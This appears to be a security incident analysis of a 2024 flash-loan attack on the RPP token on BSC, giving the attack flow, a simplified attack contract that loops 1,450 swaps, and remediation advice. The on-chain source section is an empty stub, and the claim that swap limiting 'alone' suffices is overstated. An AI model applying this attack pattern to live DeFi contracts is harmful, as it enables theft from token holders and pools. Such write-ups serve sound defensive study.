# RPP — Flash Loan Price Manipulation Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-11-06 |
| **Protocol** | RPP Token |
| **Chain** | BSC |
| **Loss** | ~14,100 USD |
| **Attacker** | [0x709b30b6](https://bscscan.com/address/0x709b30b69176a3ccc8ef3bb37219267ee2f5b112) |
| **Attack Tx** | [0x76c39537](https://bscscan.com/tx/0x76c39537374e7fa7f206ed3c99aa6b14ccf1d2dadaabe6139164cc37966e40bd) |
| **Vulnerable Contract** | [0x7d1a6930](https://bscscan.com/address/0x7d1a69302d2a94620d5185f2d80e065454a35751) |
| **Root Cause** | RPP token's transfer/swap logic directly references AMM spot reserves without TWAP, allowing profit extraction via 1,450 repeated manipulations within a single transaction |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/RPP_exp.sol) |

---
## 1. Vulnerability Overview

The RPP token referenced the spot reserve ratio of a PancakeSwap LP in its swap/transfer logic. The attacker borrowed 1.2M USDT via a PancakeV3 flash loan and repeatedly manipulated those reserves 1,450 times to extract profit. The high iteration count indicates that each step yields a small gain that accumulates into a significant total.

## 2. Vulnerable Code Analysis

```solidity
// ❌ RPP Token: AMM spot reserve-based logic
contract RPPToken {
    IPancakePair lpPair;

    function getTokenPrice() internal view returns (uint256) {
        // ❌ Price calculated from spot reserves — manipulable via flash loan
        (uint112 r0, uint112 r1,) = lpPair.getReserves();
        return (r1 * 1e18) / r0;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        // ❌ Fee or exchange rate calculated based on spot price
        uint256 fee = amount * getTokenPrice() / BASE;
        // → Fee/exchange rate distorted by manipulated price
    }
}

// ✅ Fix: Use TWAP or Chainlink oracle
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: RPP_decompiled.sol
contract RPP {
    function swapIng() external {}  // ❌ Vulnerability
```

## 3. Attack Flow

```
Attacker (0x709b30b6)
  │
  ├─[1]─▶ USDT.approve(PANCAKE_V2_ROUTER, max)
  │         RPP.approve(PANCAKE_V2_ROUTER, max)
  │
  ├─[2]─▶ PancakeV3Pool.flash(this, 1_200_000 USDT, 0, "")
  │
  ├─[3]─▶ pancakeV3FlashCallback executes:
  │         └─ Repeated 1,450 times:
  │             Swap USDT → RPP (manipulate AMM reserves)
  │             Exploit RPP's spot price-based logic
  │             Swap RPP → USDT (profit at manipulated price)
  │
  ├─[4]─▶ Repay flash loan including fees
  │
  └─[5]─▶ ~14,100 USD profit
```

## 4. PoC Code

```solidity
contract AttackContract {
    function start() public {
        TokenHelper.approveToken(BSC_USD, PANCAKE_V2_ROUTER, type(uint256).max);
        TokenHelper.approveToken(RPP_TOKEN, PANCAKE_V2_ROUTER, type(uint256).max);

        // Flash loan 1.2M USDT
        IPancakeV3PoolActions(PANCAKE_V3_POOL).flash(address(this), borrowedAmount, 0, "");

        // Transfer profit
        TokenHelper.transferToken(BSC_USD, attacker, TokenHelper.getTokenBalance(BSC_USD, address(this)));
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        // ❌ Accumulate price manipulation profit via 1,450 repeated swaps
        uint256 times = 1450;
        for (uint256 i = 0; i < times; i++) {
            // USDT → RPP (manipulate reserves)
            swapUSDTtoRPP(smallAmount);
            // RPP → USDT (profit at manipulated price)
            swapRPPtoUSDT(rppBalance);
        }

        // Repay flash loan
        TokenHelper.transferToken(BSC_USD, PANCAKE_V3_POOL,
            borrowedAmount + fee0);
    }
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Oracle Manipulation / Business Logic Vulnerability |
| **Attack Vector** | Flash loan + repeated AMM spot price manipulation |
| **CWE** | CWE-682: Incorrect Calculation |
| **DASP** | Oracle Vulnerability |
| **Severity** | Medium |

## 6. Remediation Recommendations

1. **Use TWAP**: Apply time-weighted average price instead of AMM spot reserves
2. **Prevent repeated manipulation**: Detect and limit repeated swaps within a single transaction
3. **Slippage cap**: Set an allowable range for spot price fluctuation
4. **Independent oracle**: Decouple price references in token logic from the AMM

## 7. Lessons Learned

- An attack requiring 1,450 iterations yields only a small gain per step, but remains profitable as long as the cumulative gain exceeds gas costs.
- Any token logic that references AMM spot prices is vulnerable to flash loan + repeated swap attacks.
- Repeated-manipulation prevention alone (rate limiting, single-block restrictions) is sufficient to neutralize this class of attack.